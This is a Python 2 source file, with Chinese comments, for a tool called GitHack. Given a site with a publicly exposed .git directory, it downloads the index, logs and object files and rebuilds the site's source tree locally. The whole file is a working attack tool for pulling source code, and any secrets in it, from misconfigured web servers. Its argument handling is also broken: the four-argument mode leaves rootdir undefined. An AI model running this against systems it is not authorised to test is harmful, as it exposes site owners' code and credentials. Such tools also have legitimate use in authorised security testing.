# coding:utf-8
# python2
import os,sys
try:
    import requests
except:
    print 'Lost "requests" Module.\nyou can execute "pip install requests" to install this module.'
    exit(1)

class GitHack:
    #params->hosturl: 远程git仓库url，如：http://url/.git/
    #       ->rootdir: 本地会在这个目录建立git版本库
    def __init__(self,hosturl,rootDir='githack'):
        self.host = hosturl.strip('/')+'/'
        self.dir = rootDir

        if not os.path.exists(rootDir):
            os.makedirs(rootDir)
        os.chdir(rootDir)
        os.popen('git init')

    def getFile(self,urlpath):
        '''
        功能：从指定的相对url中获取文件，并存储在本地（使用相同的相对路径）
        参数：urlpath是文件相对于self.host的路径
        注意：本函数会检查目录路径是否存在，只捕获reqeusts.get的异常
        '''
        try:
            r = requests.get(self.host+urlpath)
        except:
            print 'Error!the {} requests failed!'.format(self.host+'.git/'+urlpath)
            return False
        if r.status_code == 404:
            print 'Error!no such file {}'.format(urlpath)
            return False
        a = urlpath.rfind('/')
        if -1 != a:
            if not os.path.exists('.git/'+urlpath[:a]):
                os.makedirs('.git/'+urlpath[:a])
        f = open('.git/'+urlpath,'w')
        f.write(r.content)
        r.close()
        f.close()
        print 'Download file {} ok!'.format(urlpath)
        return True

    def fromIndex(self):
        '''
        功能：还原暂存区的对象
        '''
        self.getFile('index')
        rst = os.popen('git ls-files --stage').readlines()
        queryDic = {}
        sucDic = {}
        for i in rst:
            a = i.find(' ')
            b = i.rfind(' ')
            c = i.rfind('\t')
            queryDic[i[a+1:b]] = i[c+1:-1]
        for f in queryDic:
            if(self.getFile('objects/{}/{}'.format(f[:2],f[2:]))):
                sucDic[f] = queryDic[f]
        return sucDic

    def fromLogs(self):
        '''
        功能：从logs/HEAD文件开始，还原所有对象
        '''
        self.getFile('index')
        self.getFile('logs/HEAD')
        self.getFile('HEAD')
        self.getFile('refs/heads/master')
        logs = []
        queryList = []
        sucDic = {}
        with open('.git/logs/HEAD','r') as f:
            logs = f.readlines()
        for l in logs:
            a = l.find(' ')
            queryList.append(l[a+1:a+1+40])
        for f in queryList:
            if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
                #tree
                s = os.popen('git cat-file -p {}'.format(f)).readlines()[0]
                s = s[5:-1]
                sucDic.update(self.__getTree(s))
        return sucDic

    def __getTree(self,f,prefix=''):
        '''
        功能：递归获取指定tree类型对象下的所有blob对象
        参数：f 是指定对象的sha1值，他应该是tree类型
        prefix 是前一个tree对象对应的目录，它使用来还原文件的原始路径的。类似于 objects/
        
        '''
        sucDic = {}
        if self.getFile('objects/{}/{}'.format(f[:2],f[2:])):
            for i in os.popen('git cat-file -p {}'.format(f)).readlines():
                d = i.find(' ')+1
                if 'tree' == i[d:d+4]:
                    a = i.find('tree')+5
                    b = i.rfind('\t')
                    sucDic.update(self.__getTree(i[a:b],prefix+i[b+1:-1]+'/'))
                    continue
                
                a = i.find('blob')+5
                b = i.rfind('\t')
                if self.getFile('objects/{}/{}'.format(i[a:a+2],i[a+2:b])):
                    sucDic[i[a:b]] = prefix+i[b+1:-1]
        return sucDic

    def saveFile(self,sucDic):
        '''
        功能：根据sucDic获取文件的内容,他并不是必要的函数，他只是将所有blob对象还原成文件
        参数：sucDic类似于{'111...1':'1.txt'}键为对象sha1值，值为对应文件名路径
        '''
        for i in sucDic:
            text = os.popen('git cat-file -p {}'.format(i)).read()
            #mkdir
            a = sucDic[i].rfind('/')
            if(-1 != a):
                if not os.path.exists(sucDic[i][:a]):
                    os.makedirs(sucDic[i][:a])
            f = open(sucDic[i],'w')
            f.write(text)
            f.close()
            print 'save file {}.'.format(sucDic[i])

def usage():
    print '''usage:python githack.py hosturl [rootdir] [fromlogs]
                    params：hosturl为包含git目录的url
                            rootdirgit目录会下载到该目录
                            fromlogs可以为任意值即可变为第二个模式。
                    本脚本有两个模式（默认1）：1.下载暂存区的文件。2.从logs中遍历所有对象'''

def main():
    '''
    没怎么处理异常，也没美化命令行，有时间做
    '''
    log = False
    if len(sys.argv)==3:
        rootdir = sys.argv[2]
    elif len(sys.argv)==2:
        rootdir = 'githack'
    elif len(sys.argv)==4:
        log = True
    else:
        usage()
        return
    g = GitHack(sys.argv[1],rootdir)
    if log:
        print 'from Logs mod!'
        sucDic = g.fromLogs()
    else:
        print 'from index mod!'
        sucDic = g.fromIndex()
    #print sucDic
    print ''
    g.saveFile(sucDic)

main()